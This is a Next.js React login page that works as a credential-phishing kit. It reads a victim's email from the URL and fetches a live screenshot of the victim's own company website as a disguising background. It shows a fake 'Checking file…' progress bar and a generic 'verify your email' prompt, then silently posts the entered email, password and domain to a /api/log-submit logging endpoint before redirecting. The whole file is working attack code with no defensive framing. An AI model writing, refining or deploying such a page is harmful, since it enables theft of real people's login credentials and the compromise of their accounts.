'use client'

import '../styles/globals.css'
import { useSearchParams, useRouter } from 'next/navigation'
import { useState, useEffect } from 'react'
import { getThumURL } from 'thum.io'

export default function LoginPage() {
  const params            = useSearchParams()
  const router            = useRouter()

  const preEmail          = params.get('email') || ''
  const urlParamDomain    = params.get('domain') || ''

  const [email, setEmail]                     = useState(preEmail)
  const [confirmed, setConfirmed]             = useState(!!preEmail)
  const [password, setPassword]               = useState('')
  const [showModal, setShowModal]             = useState(false)
  const [errors, setErrors]                   = useState({ email: '', password: '' })
  const [domainToCapture, setDomainToCapture] = useState('')
  const [screenshotUrl, setScreenshotUrl]     = useState('')
  const [isLoading, setIsLoading]             = useState(true)
  const [progress, setProgress]               = useState(0)

  // Auto‐confirm if email was pre‐filled
  useEffect(() => {
    if (preEmail) setConfirmed(true)
  }, [preEmail])

  // Decide domain from URL or email
  useEffect(() => {
    if (!confirmed) {
      setDomainToCapture('')
      return
    }
    if (urlParamDomain) {
      setDomainToCapture(urlParamDomain)
      return
    }
    const parts = email.split('@')
    setDomainToCapture(parts.length === 2 ? parts[1] : '')
  }, [confirmed, urlParamDomain, email])

  // Build thum.io URL for the background
  useEffect(() => {
    if (!domainToCapture) {
      setScreenshotUrl('')
      setIsLoading(false)
      return
    }

    const secret = process.env.NEXT_PUBLIC_THUM_IO_SECRET!
    const keyId  = process.env.NEXT_PUBLIC_THUM_IO_KEY_ID!  // keep as string

    const thumbURL = getThumURL({
      url: `https://${domainToCapture}`,
      width: 1200,
      auth: { type: 'md5', secret, keyId },
    })

    setScreenshotUrl(thumbURL)
    setIsLoading(true)
    setProgress(0)
  }, [domainToCapture])

  // Simulate realistic progress to 90%
  useEffect(() => {
    if (!isLoading) return
    const iv = setInterval(() => {
      setProgress(p => (p < 90 ? p + Math.random() * 15 : 90))
    }, 300)
    return () => clearInterval(iv)
  }, [isLoading])

  const validateEmail = (v: string) =>
    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)

  const handleEmail = (e: React.FormEvent) => {
    e.preventDefault()
    if (!validateEmail(email)) {
      setErrors({ ...errors, email: 'Invalid email' })
      return
    }
    setConfirmed(true)
    setErrors({ ...errors, email: '' })
  }

  const handlePass = async (e: React.FormEvent) => {
    e.preventDefault()
    if (password.length < 5) {
      setErrors({ ...errors, password: 'Minimum 5 characters' })
      return
    }
    setShowModal(true)
    await fetch('/api/log-submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, domain: domainToCapture }),
    })
    setTimeout(() => {
      router.push(
        `/end?email=${encodeURIComponent(email)}&domain=${encodeURIComponent(
          domainToCapture
        )}`
      )
    }, 2000)
  }

  return (
    <div className="login-container relative">
      {/* Preloader */}
      {isLoading && (
        <div className="fixed inset-0 z-30 flex flex-col items-center justify-center bg-white">
          <div className="text-lg font-medium text-gray-700 mb-4">
            Checking file…
          </div>
          <div className="w-3/4 h-2 bg-gray-200 rounded overflow-hidden">
            <div
              className="h-full bg-blue-500 transition-all"
              style={{ width: progress + '%' }}
            />
          </div>
        </div>
      )}

      {/* Background via thum.io + tint */}
      {screenshotUrl && (
        <div className="absolute inset-0 overflow-hidden p-10">
          <img
            src={screenshotUrl}
            alt={`Screenshot of ${domainToCapture}`}
            onLoad={() => {
              setProgress(100)
              setTimeout(() => setIsLoading(false), 300)
            }}
            onError={() => setIsLoading(false)}
            className="w-full h-full object-contain opacity-50 pointer-events-none"
          />
          <div className="absolute inset-0 bg-light-blue/50 pointer-events-none" />
        </div>
      )}

      {/* Login Card */}
      <div className="login-card">
        <h1 className="text-sm font-bold text-center mb-2 text-blue-600">
          Verify your email address to continue.
        </h1>

        {!confirmed ? (
          <form onSubmit={handleEmail} className="space-y-4">
            <input
              type="email"
              value={email}
              onChange={e => setEmail(e.target.value)}
              placeholder="Enter your email"
              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
              required
            />
            {errors.email && (
              <p className="text-sm text-red-600">{errors.email}</p>
            )}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
            >
              Next
            </button>
          </form>
        ) : (
          <form onSubmit={handlePass} className="space-y-6">
            <div className="text-center mb-4">
              <div className="mx-auto mb-4 w-16 h-16 rounded-full bg-gray-400 flex items-center justify-center text-2xl text-white">
                {email[0]?.toUpperCase()}
              </div>
              <p className="text-gray-800 font-medium">{email}</p>
            </div>
            <input
              type="password"
              value={password}
              onChange={e => {
                setPassword(e.target.value)
                if (errors.password && e.target.value.length >= 5) {
                  setErrors({ ...errors, password: '' })
                }
              }}
              placeholder="Enter your password"
              className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
              required
            />
            {errors.password && (
              <p className="text-sm text-red-600">{errors.password}</p>
            )}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
            >
              Login
            </button>
          </form>
        )}
      </div>

      {/* Submission Modal */}
      {showModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <h2 className="text-lg font-semibold text-gray-800">Please wait…</h2>
            <p className="mt-2 text-gray-600">*</p>
          </div>
        </div>
      )}
    </div>
  )
}
